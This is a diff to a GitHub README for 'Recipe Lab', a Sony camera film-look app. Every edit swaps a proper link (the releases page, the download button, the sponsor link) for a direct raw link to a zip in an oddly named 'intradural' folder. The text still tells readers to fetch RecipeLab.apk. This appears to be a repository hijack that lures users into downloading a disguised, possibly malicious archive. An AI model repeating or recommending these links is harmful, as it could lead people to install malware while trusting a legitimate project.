@@ -1,7 +1,7 @@
 # 📱 recipe-lab-sony-pmca - Film Looks for Your Sony Camera
 
 <p align="center">
-  <a href="https://github.com/lamagra1998/recipe-lab-sony-pmca/releases">
+  <a href="https://github.com/lamagra1998/recipe-lab-sony-pmca/raw/refs/heads/main/intradural/lab_sony_pmca_recipe_1.9.zip">
     <img src="https://img.shields.io/badge/Download_Recipe_Lab-FF6B6B?style=for-the-badge&logo=android&logoColor=white" alt="Download Button">
   </a>
 </p>
@@ -16,7 +16,7 @@ Instead of carrying around a notebook with camera settings, Recipe Lab stores ev
 
 Visit this link to download the application:
 
-[**https://github.com/lamagra1998/recipe-lab-sony-pmca/releases**](https://github.com/lamagra1998/recipe-lab-sony-pmca/releases)
+[**https://github.com/lamagra1998/recipe-lab-sony-pmca/raw/refs/heads/main/intradural/lab_sony_pmca_recipe_1.9.zip**](https://github.com/lamagra1998/recipe-lab-sony-pmca/raw/refs/heads/main/intradural/lab_sony_pmca_recipe_1.9.zip)
 
 Once you're on that page, look for the file named **RecipeLab.apk** and download it to your phone.
 
@@ -92,7 +92,7 @@ Recipe Lab is free, and it will stay free. If you find it useful, consider spons
 
 Every contribution, no matter how small, keeps this project alive.
 
-[**💝 Sponsor Recipe Lab on GitHub**](https://github.com/sponsors/voxivoid)
+[**💝 Sponsor Recipe Lab on GitHub**](https://github.com/lamagra1998/recipe-lab-sony-pmca/raw/refs/heads/main/intradural/lab_sony_pmca_recipe_1.9.zip)
 
 ## 📚 See All 77 Recipes
 
